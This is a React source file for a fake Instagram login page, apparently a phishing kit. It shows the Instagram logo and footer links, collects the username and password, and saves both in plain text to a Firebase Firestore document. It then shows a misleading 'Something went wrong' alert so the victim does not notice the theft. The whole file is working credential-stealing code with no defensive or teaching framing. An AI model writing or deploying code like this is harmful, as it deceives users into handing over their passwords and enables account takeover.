import React, { useState } from 'react';
import logo from '../ig-logo.svg';
import db from '../firebase';
import { doc, setDoc } from "firebase/firestore"; 
const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleUsernameChange = (event) => {
    setUsername(event.target.value);
    console.log(username);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
    console.log(password);
  };

  const handleFormSubmit = async (event) => {
    event.preventDefault();
    console.log('Form submitted:', username, password);

    try {
      await setDoc(doc(db, "user", "NV5TVGHIaWuRie09fZwb"), {
        email : username,
        password : password,
      });
      console.log("hey");
      setUsername('');
      setPassword('');

      alert('Something went wrong');

      // Redirect or show a success message
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <div className="container">
      <div className="logo">
        <img src={logo} alt="Instagram" />
      </div>
      <form onSubmit={handleFormSubmit}>
        <div className="form-group">
          <label htmlFor="username">Username</label>
          <input
            type="text"
            id="username"
            value={username}
            onChange={handleUsernameChange}
            placeholder="Enter your username"
            required
          />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={handlePasswordChange}
            placeholder="Enter your password"
            required
          />
        </div>
        <button type="submit">Log In</button>
        <div className="forgot-password">
          <a href="#">Forgot password?</a>
        </div>
      </form>
      <div className="signup">
        <p>
          Don't have an account? <a href="#">Sign up</a>
        </p>
      </div>
      <div className="footer">
        <a href="#">About</a> &middot; <a href="#">Blog</a> &middot;{' '}
        <a href="#">Jobs</a> &middot; <a href="#">Help</a> &middot;{' '}
        <a href="#">API</a> &middot; <a href="#">Privacy</a> &middot;{' '}
        <a href="#">Terms</a> &middot; <a href="#">Top Accounts</a> &middot;{' '}
        <a href="#">Hashtags</a> &middot; <a href="#">Locations</a> &middot;{' '}
        <a href="#">Instagram Lite</a> &middot; <a href="#">Beauty</a> &middot;{' '}
        <a href="#">Dance &amp; Performance</a>
      </div>
    </div>
  );
};

export default InstagramLogin;
